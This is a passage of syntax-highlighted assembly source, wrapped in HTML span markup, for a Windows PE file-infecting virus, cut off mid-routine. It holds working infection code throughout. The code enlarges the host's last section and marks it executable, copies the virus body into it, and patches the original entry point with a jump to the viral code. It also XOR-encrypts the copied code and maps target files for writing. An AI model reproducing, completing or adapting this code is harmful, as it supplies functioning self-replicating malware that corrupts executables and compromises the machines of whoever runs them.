</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc2">28h</span><span class="sc0">
</span><span class="sc6">loop</span><span class="sc0"> </span><span class="sc5">LastSection</span><span class="sc0">
</span><span class="sc1">;we have ebx -&gt; last section </span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">24h</span><span class="sc4">],</span><span class="sc2">0A0000020h</span><span class="sc0"> </span><span class="sc1">;section is executable,readable,writable and with code</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebx</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">10h</span><span class="sc4">]</span><span class="sc1">;size of raw data</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebx</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">0ch</span><span class="sc4">]</span><span class="sc1">;add size + RVA of section.</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">MyEntryPoint</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">SVirus</span><span class="sc0">
</span><span class="sc1">;eax = New Entry Point</span><span class="sc0">
</span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">OldEntryPoint</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">EPOCodeSize</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">EPOrel32</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebx</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">10h</span><span class="sc4">]</span><span class="sc1">;size of raw data</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebx</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">14h</span><span class="sc4">]</span><span class="sc1">;add size + pointer to raw data of section.We are in the end of last section</span><span class="sc0">
             </span><span class="sc1">;We must copy there our code ;)</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">EndLastSection</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">

</span><span class="sc1">;now we must alignment section</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">esi</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">10h</span><span class="sc4">]</span><span class="sc1">;size of raw</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">EVirus</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">SVirus</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">FileAlignment</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
</span><span class="sc6">div</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
</span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc6">mul</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">10h</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc1">;new sizeofrawdata</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">8</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc1">;new VirtualSize</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">0ch</span><span class="sc4">]</span><span class="sc1">;size + virtual address</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">ViewHandle</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,[</span><span class="sc8">ebx</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">3ch</span><span class="sc4">]</span><span class="sc1">;lfanew</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc1">;ebx -&gt; PE</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">50h</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc1">;new size of image</span><span class="sc0">

</span><span class="sc5">EPOzone</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc1">;well,we have modified executable for introducting our code.Here we can modify</span><span class="sc0">
</span><span class="sc1">;entry point for pointing to our code but i think EPO methods its more efective.</span><span class="sc0">

</span><span class="sc1">;first all i must search the entry point,but no when file is executing,i must search</span><span class="sc0">
</span><span class="sc1">;raw entry point,entry point in file.There i must copy EPOCode.</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">Sections</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">FirstSection</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">OldEntryPoint</span><span class="sc4">]</span><span class="sc0">

</span><span class="sc5">FindCodeSec</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebx</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">0ch</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebx</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">10h</span><span class="sc4">]</span><span class="sc1">;eax -&gt; end of this section</span><span class="sc0">
</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">esi</span><span class="sc0">
</span><span class="sc6">jg</span><span class="sc0">  </span><span class="sc5">FoundCodeSec</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc2">28h</span><span class="sc0">
</span><span class="sc6">loop</span><span class="sc0"> </span><span class="sc5">FindCodeSec</span><span class="sc0">

</span><span class="sc5">FoundCodeSec</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc1">;ebx -&gt;header of section with entry point</span><span class="sc0">

</span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">0ch</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">14h</span><span class="sc4">]</span><span class="sc1">;raw_e_point = e_point - VASection + PointerToRawDataSection </span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">OldRawEntryPoint</span><span class="sc4">],</span><span class="sc8">esi</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">ViewHandle</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
</span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">EPORestoreBytes</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc5">EPOCodeSize</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
</span><span class="sc6">rep</span><span class="sc0"> </span><span class="sc6">movsb</span><span class="sc0">
</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
</span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">SEPOCode</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">edi</span><span class="sc0">
</span><span class="sc6">rep</span><span class="sc0"> </span><span class="sc6">movsb</span><span class="sc0">

</span><span class="sc1">;now we have copied bytes for EPO to entrypoint and old bytes to EPORestoreBytes for</span><span class="sc0">
</span><span class="sc1">;restoring when we return to host</span><span class="sc0">

</span><span class="sc1">;now we must copy virus code (encrypting necesary parts) to EndLastSection</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">EndLastSection</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">ViewHandle</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
</span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">SVirus</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc5">EVirus</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">SVirus</span><span class="sc0">
</span><span class="sc6">rep</span><span class="sc0"> </span><span class="sc6">movsb</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">kernel</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc5">GezApi</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">GetTickCountCRC</span><span class="sc4">,</span><span class="sc5">GTCNameLen</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
</span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">0FFFF0000h</span><span class="sc0">
</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">Encryption</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">YesEncrypt</span><span class="sc0">
</span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc5">YesEncrypt</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,((</span><span class="sc5">ECode</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">SCode</span><span class="sc4">)/</span><span class="sc2">4</span><span class="sc4">)-</span><span class="sc2">1</span><span class="sc0">
</span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
</span><span class="sc5">CryptitExplorerCode</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
</span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc4">*</span><span class="sc8">ecx</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc6">or</span><span class="sc0">  </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">
</span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">CryptitExplorerCode</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc5">Encrypted</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">SCode</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">CryptKey</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,((</span><span class="sc5">EVirus</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">Encrypted</span><span class="sc4">)/</span><span class="sc2">4</span><span class="sc4">)-</span><span class="sc2">1</span><span class="sc0">
</span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
</span><span class="sc5">CryptitFirstCode</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
</span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc4">*</span><span class="sc8">ecx</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc6">or</span><span class="sc0">  </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">
</span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">CryptitFirstCode</span><span class="sc0">
</span><span class="sc5">CloseAndBye</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc5">callz</span><span class="sc0"> </span><span class="sc5">CloseAll</span><span class="sc0">
</span><span class="sc5">EndInfection</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">popad</span><span class="sc0">
</span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">;;;;;;;;;;;;;;;;;;;;;;</span><span class="sc0">

</span><span class="sc5">FileHandle</span><span class="sc0">          </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">MappingHandle</span><span class="sc0">       </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">ViewHandle</span><span class="sc0">          </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">FileInfectedSize</span><span class="sc0">    </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">FileAlignment</span><span class="sc0">       </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">Sections</span><span class="sc0">            </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">FirstSection</span><span class="sc0">        </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">EndLastSection</span><span class="sc0">      </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">OldRawEntryPoint</span><span class="sc0">    </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">Encryption</span><span class="sc0">          </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">

</span><span class="sc1">;;;;;;;;;;;;;;;;;;;;;;;;</span><span class="sc0">

</span><span class="sc5">SEPOCode</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0E9h</span><span class="sc0"> </span><span class="sc1">;rel jmp to our code </span><span class="sc0">
</span><span class="sc5">EPOrel32</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">EEPOCode</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc5">EPOCodeSize</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc5">EEPOCode</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">SEPOCode</span><span class="sc0">

</span><span class="sc1">;;;;;;;;;;;;;;;;;;;;;;</span><span class="sc0">

</span><span class="sc1">;;;;;;;;;;;;;;;;;;;;;;</span><span class="sc0">

</span><span class="sc5">MapFile</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc1">;it maps the file in WIN32_FIND_DATA</span><span class="sc0">
</span><span class="sc5">ChangeAttributesOfFile</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">WFD_szFileName</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">80h</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">kernel</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc5">GezApi</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">SetFileAttributesACRC</span><span class="sc4">,</span><span class="sc5">SFANameLen</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0C0000000h</span><span class="sc0"> </span><span class="sc1">;read and write access to file</span><span class="sc0">
</span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">WFD_szFileName</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">kernel</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc5">GezApi</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">CreateFileACRC</span><span class="sc4">,</span><span class="sc5">CFNameLen</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc6">inc</span><span class="sc0">  </span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc6">or</span><span class="sc0">   </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc6">jnz</span><span class="sc0">  </span><span class="sc5">np1</span><span class="sc0"> 
</span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">np1</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">dec</span><span class="sc0">  </span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0">  </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">FileHandle</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0">  </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">WFD_nFileSizeLow</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">FileHandle</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">kernel</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc5">GezApi</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">CreateFileMappingACRC</span><span class="sc4">,</span><span class="sc5">CFMNameLen</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc6">or</span><span class="sc0">   </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">CloseFile</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">MappingHandle</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">WFD_nFileSizeLow</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">000F001Fh</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0">  </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">kernel</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc5">GezApi</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">MapViewOfFileCRC</span><span class="sc4">,</span><span class="sc5">MVFNameLen</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">CloseMapping</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">ViewHandle</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc6">ret</span><span class="sc0">


</span><span class="sc1">;;;;;;;;;;;;;;;;;;;;;;</span><span class="sc0">

</span><span class="sc5">CloseAll</span><span class="sc4">:</span><span class="sc1">;close file opened with MapFile</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">kernel</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc5">GezApi</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">UnmapViewOfFileCRC</span><span class="sc4">,</span><span class="sc5">UVFNameLen</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">ViewHandle</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

</span><span class="sc5">CloseMapping</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">kernel</span><span class="sc4">]</span><span class="sc0">
